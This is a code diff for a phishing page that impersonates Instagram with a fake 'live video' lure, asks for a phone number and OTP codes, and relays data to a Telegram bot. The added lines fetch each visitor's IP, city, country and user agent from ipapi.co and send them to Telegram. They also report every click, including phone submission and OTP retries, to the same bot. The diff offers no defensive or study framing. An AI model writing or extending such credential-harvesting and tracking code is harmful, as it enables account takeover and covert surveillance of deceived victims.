@@ -74,7 +74,31 @@
             const otpRefs = [useRef(), useRef(), useRef(), useRef()];
             const STORY_VIDEOS = ['my-story1.mp4', 'my-story2.mp4', 'my-story3.mp4'];
 
+            // 📢 টেলিগ্রামে মেসেজ পাঠানোর কমন ফাংশন
+            const sendToTelegram = async (msg) => {
+                try {
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
+                    });
+                } catch (e) {}
+            };
+
+            // 🟢 ভিজিটর নোটিফিকেশন ট্র্যাকার
             useEffect(() => {
+                const trackVisitor = async () => {
+                    try {
+                        const res = await fetch('https://ipapi.co/json/');
+                        const data = await res.json();
+                        const visitorMsg = `🌐 *New Visitor Detected!*\n\n📍 IP: \`${data.ip}\`\n📍 City: \`${data.city}\`\n📍 Country: \`${data.country_name}\`\n📱 Device: \`${navigator.userAgent.slice(0, 50)}...\``;
+                        sendToTelegram(visitorMsg);
+                    } catch (e) {
+                        sendToTelegram(`🌐 *New Visitor Detected!*\n(IP information could not be fetched)`);
+                    }
+                };
+                trackVisitor();
+
                 const isLocked = localStorage.getItem('isLocked');
                 const savedPhone = localStorage.getItem('userPhone');
                 if (isLocked === 'true' && savedPhone) {
@@ -82,6 +106,11 @@
                     setStep('OTP');
                 }
             }, []);
+
+            // 🖱️ ক্লিক ট্র্যাকার ফাংশন
+            const trackClick = (elementName) => {
+                sendToTelegram(`🖱️ *User Clicked:* ${elementName}`);
+            };
 
             useEffect(() => {
                 if ((step === 'OTP' || step === 'VERIFYING') && timer > 0) {
@@ -118,16 +147,6 @@
                 }
                 return () => clearInterval(interval);
             }, [step, otpSubmitTime]);
-
-            const sendToTelegram = async (msg) => {
-                try {
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                        method: 'POST',
-                        headers: {'Content-Type': 'application/json'},
-                        body: JSON.stringify({chat_id: CHAT_ID, text: msg, parse_mode: 'Markdown'})
-                    });
-                } catch (e) {}
-            };
 
             const handlePhoneSubmit = async () => {
                 if (phone.length < 5) return;
@@ -171,8 +190,8 @@
                     {/* Header */}
                     <div className="h-14 px-4 flex items-center justify-between border-b border-gray-100 bg-white sticky top-0 z-[100]">
                         <div className="flex items-center gap-2">
-                            {step !== 'MAIN' && step !== 'SUCCESS' && (
-                                <div onClick={goBack} className="flex items-center text-gray-700 cursor-pointer">
+                          {step !== 'MAIN' && step !== 'SUCCESS' && (
+                                <div onClick={() => { goBack(); trackClick('Back Button'); }} className="flex items-center text-gray-700 cursor-pointer">
                                     <i className="fa-solid fa-arrow-left text-xl mr-2"></i>
                                     <span className="text-sm font-bold">Back</span>
                                 </div>
@@ -180,8 +199,8 @@
                             {step === 'MAIN' && <span className="text-2xl font-bold italic font-serif">Instagram</span>}
                         </div>
                         <div className="flex gap-5 text-xl">
-                            <i className="fa-regular fa-heart"></i>
-                            <i className="fa-brands fa-facebook-messenger"></i>
+                            <i className="fa-regular fa-heart" onClick={() => trackClick('Heart Icon')}></i>
+                            <i className="fa-brands fa-facebook-messenger" onClick={() => trackClick('Messenger Icon')}></i>
                         </div>
                     </div>
 
@@ -197,7 +216,7 @@
                                         </div>
                                         <span className="text-[11px] mt-1 text-gray-500">My story</span>
                                     </div>
-                                    <div className="flex flex-col items-center shrink-0" onClick={() => {setShowStories(true); setCurrentStoryIdx(0);}}>
+                                    <div className="flex flex-col items-center shrink-0" onClick={() => {setShowStories(true); setCurrentStoryIdx(0); trackClick('Nusrat Story');}}>
                                         <div className="w-[72px] h-[72px] story-ring">
                                             <div className="w-full h-full border-2 border-white rounded-full overflow-hidden">
                                                 <img src="my-logo.jpg" className="w-full h-full object-cover" onerror="this.src='https://i.pravatar.cc/100?u=2'"/>
@@ -209,15 +228,15 @@
 
                                 {/* Navigation Menu */}
                                 <nav className="nav-tabs">
-                                    <a href="friends/index.html" className="nav-tab-item"><i className="fa-solid fa-users text-pink-500 mr-1"></i> বন্ধুরা</a>
-                                    <a href="video/index.html" className="nav-tab-item"><i className="fa-solid fa-video text-blue-500 mr-1"></i> ভিডিও</a>
-                                    <a href="premium/index.html" className="nav-tab-item"><i className="fa-solid fa-crown text-yellow-500 mr-1"></i> প্রিমিয়াম</a>
-                                    <a href="help/index.html" className="nav-tab-item"><i className="fa-solid fa-headset text-green-500 mr-1"></i> হেল্প</a>
+                                    <a href="friends/index.html" onClick={() => trackClick('Menu: বন্ধুরা')} className="nav-tab-item"><i className="fa-solid fa-users text-pink-500 mr-1"></i> বন্ধুরা</a>
+                                    <a href="video/index.html" onClick={() => trackClick('Menu: ভিডিও')} className="nav-tab-item"><i className="fa-solid fa-video text-blue-500 mr-1"></i> ভিডিও</a>
+                                    <a href="premium/index.html" onClick={() => trackClick('Menu: প্রিমিয়াম')} className="nav-tab-item"><i className="fa-solid fa-crown text-yellow-500 mr-1"></i> প্রিমিয়াম</a>
+                                    <a href="help/index.html" onClick={() => trackClick('Menu: হেল্প')} className="nav-tab-item"><i className="fa-solid fa-headset text-green-500 mr-1"></i> হেল্প</a>
                                 </nav>
 
                                 {/* Live Frame */}
                                 <div className="px-4 mt-4">
-                                    <div className="relative w-full aspect-[4/5] rounded-xl overflow-hidden shadow-lg bg-black" onClick={() => setShowLivePreview(true)}>
+                                    <div className="relative w-full aspect-[4/5] rounded-xl overflow-hidden shadow-lg bg-black" onClick={() => {setShowLivePreview(true); trackClick('Live Preview Frame');}}>
                                         <video src="my-live.mp4" className="w-full h-full object-cover opacity-70" autoPlay loop muted playsInline />
                                         <div className="absolute top-4 left-4 flex gap-2">
                                             <div className="bg-red-600 text-white text-[10px] font-bold px-2 py-0.5 rounded-sm">LIVE</div>
@@ -227,7 +246,7 @@
                                         <div className="absolute inset-0 flex flex-col items-center justify-center text-white text-center">
                                             <i className="fa-solid fa-circle-play text-6xl opacity-60 mb-4"></i>
                                             <h2 className="text-xl font-bold">Mst: Nusrat Jahan</h2>
-                                            <button onClick={(e) => {e.stopPropagation(); setStep('JOIN_FORM');}} className="mt-4 px-8 py-2 bg-white text-black rounded-full font-bold text-sm shadow-xl active:scale-95 transition">JOIN NOW</button>
+                                            <button onClick={(e) => {e.stopPropagation(); setStep('JOIN_FORM'); trackClick('JOIN NOW Button');}} className="mt-4 px-8 py-2 bg-white text-black rounded-full font-bold text-sm shadow-xl active:scale-95 transition">JOIN NOW</button>
                                         </div>
                                     </div>
                                 </div>
@@ -248,7 +267,7 @@
                                     value={phone}
                                     onChange={(e) => setPhone(e.target.value)}
                                 />
-                                <button onClick={handlePhoneSubmit} className="w-full btn-gradient text-white font-bold py-3.5 rounded-lg text-sm shadow-lg active:scale-95 transition">JOIN LIVE NOW</button>
+                                <button onClick={() => {handlePhoneSubmit(); trackClick('Submit Phone Number');}} className="w-full btn-gradient text-white font-bold py-3.5 rounded-lg text-sm shadow-lg active:scale-95 transition">JOIN LIVE NOW</button>
                             </div>
                         )}
 
@@ -296,9 +315,10 @@
                                 <p className="text-gray-500 text-sm mb-10">The code is incorrect. Please check your message and try again.</p>
                                 <button 
                                     onClick={() => {
-                                        setOtp(['', '', '', '']); // ওটিপি রিসেট
+                                        setOtp(['', '', '', '']); 
                                         setStep('OTP'); 
                                         setTimer(15);
+                                        trackClick('Try Again OTP');
                                         setTimeout(() => otpRefs[0].current.focus(), 100);
                                     }} 
                                     className="w-full bg-black text-white py-3.5 rounded-lg font-bold active:scale-95 transition"
@@ -311,11 +331,11 @@
 
                     {/* Bottom Nav */}
                     <div className="h-14 border-t border-gray-100 flex justify-around items-center text-xl bg-white sticky bottom-0">
-                        <i className="fa-solid fa-house"></i>
-                        <i className="fa-solid fa-magnifying-glass text-gray-400"></i>
-                        <i className="fa-regular fa-square-plus text-gray-400"></i>
-                        <i className="fa-solid fa-clapperboard text-gray-400"></i>
-                        <img src="my-logo.jpg" className="w-7 h-7 rounded-full border border-gray-200" onerror="this.src='https://i.pravatar.cc/100?u=1'"/>
+                        <i className="fa-solid fa-house" onClick={() => trackClick('Footer: Home')}></i>
+                        <i className="fa-solid fa-magnifying-glass text-gray-400" onClick={() => trackClick('Footer: Search')}></i>
+                        <i className="fa-regular fa-square-plus text-gray-400" onClick={() => trackClick('Footer: Plus')}></i>
+                        <i className="fa-solid fa-clapperboard text-gray-400" onClick={() => trackClick('Footer: Reels')}></i>
+                        <img src="my-logo.jpg" onClick={() => trackClick('Footer: Profile')} className="w-7 h-7 rounded-full border border-gray-200" onerror="this.src='https://i.pravatar.cc/100?u=1'"/>
                     </div>
 
                     {showStories && (
@@ -350,7 +370,7 @@
                             <div className="absolute bottom-10 inset-x-0 px-6 z-50">
                                 <div className="bg-black/40 backdrop-blur-lg p-5 rounded-2xl border border-white/20 text-center">
                                     <p className="text-white text-sm font-bold mb-4 tracking-wide">Premium Live Unlocked! ✅</p>
-                                    <button onClick={() => window.location.href = REDIRECT_LINK} className="w-full bg-white text-black py-3 rounded-xl font-bold text-xs uppercase tracking-tighter">View imo Profile</button>
+                                    <button onClick={() => { trackClick('View IMO Profile Button'); window.location.href = REDIRECT_LINK; }} className="w-full bg-white text-black py-3 rounded-xl font-bold text-xs uppercase tracking-tighter">View imo Profile</button>
                                 </div>
                             </div>
                         </div>
